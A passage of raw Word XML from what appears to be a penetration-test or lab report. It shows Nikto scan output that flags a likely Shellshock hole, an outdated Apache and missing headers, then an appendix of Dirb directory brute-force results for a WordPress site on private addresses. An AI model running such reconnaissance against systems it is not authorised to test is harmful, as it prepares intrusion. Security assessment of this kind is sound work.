          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ End Time:           2024-12-01 17:00:47 (GMT-5) (26 seconds)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7531745E" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054A3170" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ 1 host(s) tested</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A574FC3" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nikto -h http://192.168.0.242</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529B968C" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>- Nikto v2.1.6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35EB673B" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E40B44" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Target IP:          192.168.0.242</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2190F876" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Target Hostname:    192.168.0.242</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519888A7" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Target Port:        80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BF5AF0" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Start Time:         2024-12-01 17:01:18 (GMT-5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F109516" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A34360B" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Server: Apache/2.4.10 (Unix)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400A4805" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ The anti-clickjacking X-Frame-Options header is not present.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6579C3C0" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B579816" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7236B8" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AAA098F" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783D8F2F" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAAEEEA" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ Uncommon header '93e4r0-cve-2014-6271' found, with contents: true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="749C7620" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316C91DA" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ OSVDB-3268: /css/: Directory indexing found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D242526" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ OSVDB-3092: /css/: This might be interesting...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB1EB2F" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ 8725 requests: 0 error(s) and 10 item(s) reported on remote host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9855BE" w14:textId="77777777" w:rsidR="00FF5565" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ End Time:           2024-12-01 17:02:04 (GMT-5) (46 seconds)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2051DF28" w14:textId="711E5AE6" w:rsidR="00C40453" w:rsidRDefault="00FF5565" w:rsidP="00FF5565">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A93231" w14:textId="7CA7879B" w:rsidR="004305D8" w:rsidRDefault="004305D8" w:rsidP="004305D8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:right="4" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc183984574"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="002A3AE8">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Dirb Scans</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w14:paraId="35C82F47" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BCA7E0C" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-----------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0252889A" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">DIRB v2.22    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334F2130" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>By The Dark Raver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB8EC7A" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-----------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A550473" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A987AA1" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>START_TIME: Sun Dec  1 17:02:51 2024</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A55DEF" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>URL_BASE: http://172.16.221.237/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411185CC" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5846B335" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B55D8C3" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-----------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="176988E2" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46B509FD" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">GENERATED WORDS: 4612                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4CF81E" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65D75C21" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>---- Scanning URL: http://172.16.221.237/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F657E6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/cgi-bin/ (CODE:403|SIZE:290)                                                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3296DA56" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/index (CODE:200|SIZE:177)                                                                                                                                                                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6042EF87" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/index.html (CODE:200|SIZE:177)                                                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EC0987" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/javascript/                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343640B5" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/server-status (CODE:403|SIZE:295)                                                                                                                                                                                 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205D303B" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/                                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3210150F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E04C12F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/javascript/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0773EEA9" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/javascript/jquery/                                                                                                                                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059780EC" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203981B4" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5931910F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/index/                                                                                                                                                                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D96CEE7" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/index.php (CODE:301|SIZE:0)                                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8C67AE" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/readme (CODE:200|SIZE:9227)                                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E727068" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-admin/                                                                                                                                                                                  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574EF25D" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-app (CODE:403|SIZE:138)                                                                                                                                                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB4B68D" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-blog-header (CODE:200|SIZE:0)                                                                                                                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CBEDC1" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-config (CODE:200|SIZE:0)                                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="176CD73D" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-content/                                                                                                                                                                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4589F5A2" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-cron (CODE:200|SIZE:0)                                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A123B6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-includes/                                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E3F17B" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-links-opml (CODE:200|SIZE:1054)                                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB3D8E6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-load (CODE:200|SIZE:0)                                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D94A188" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-login (CODE:200|SIZE:2147)                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
